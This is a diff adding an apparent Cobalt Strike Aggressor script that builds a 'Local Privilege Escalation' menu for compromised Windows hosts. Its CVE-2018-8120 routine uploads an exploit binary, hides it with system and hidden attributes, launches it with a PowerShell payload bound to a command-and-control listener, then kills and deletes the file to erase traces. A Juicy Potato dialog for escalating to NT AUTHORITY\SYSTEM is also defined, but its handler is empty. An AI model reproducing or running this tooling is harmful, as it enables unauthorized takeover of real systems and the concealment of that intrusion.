@@ -1,0 +1,47 @@
+#define functions
+
+
+sub RunJuicyPotato{
+
+}
+
+sub CVE_2018_8120{
+    local('$Rch');
+    $Rch = "x86";
+    if (beacon_info($bid,"is64") == 1){
+        $Rch = "x64";
+    }
+    $payload = powershell($3['listener'], false, $Rch);
+    bupload($bid, script_resource("exp/8120/ $+ $Rch $+ .exe"));
+    bshell($bid, "attrib \"$Rch $+ .exe\" +s +h");
+    bshell($bid,"$Rch $+ .exe \"".$payload."\"");
+    bshell($bid,"taskkill /f /im $Rch $+ .exe");
+    bshell($bid,"del /F /S /Q /AH $Rch $+ .exe");
+}
+
+#append menus
+
+
+
+    menu "Local Privilege Escalation"{
+        item "Juicy-Potato"{
+            $bid = $1['@'];
+            $Dialog = dialog("Juicy Potato",%(Call =>"CreateProcessWithTokenW", Port => "1337", CLSID => "{4991d34b-80a1-4291-83b6-3328366b9097}", bid => $bid),&RunJuicyPotato);
+            dialog_description($Dialog, "A sugared version of RottenPotatoNG, with a bit of juice, i.e. another Local Privilege Escalation tool, from a Windows Service Accounts to NT AUTHORITY\\SYSTEM. ");
+            drow_listener($Dialog, "listener", "Listener: ");
+            drow_text($Dialog, "Call",  "Createprocess Call: ");
+            drow_text($Dialog, "Port", "Listen Port: ");
+            drow_text($Dialog, "CLSID", "CLSID: ");
+            dbutton_action($Dialog, "Exploit");
+            dialog_show($Dialog);
+        }
+
+        item "CVE-2018-8120"{
+            $bid = $1['@'];
+            $Dialog = dialog("CVE-2018-8120",%(bid => $bid),&CVE_2018_8120);
+            dialog_description($Dialog, "8120");
+            drow_listener($Dialog, "listener", "Listener: ");
+            dbutton_action($Dialog, "Exploit");
+            dialog_show($Dialog);
+        }
+    }
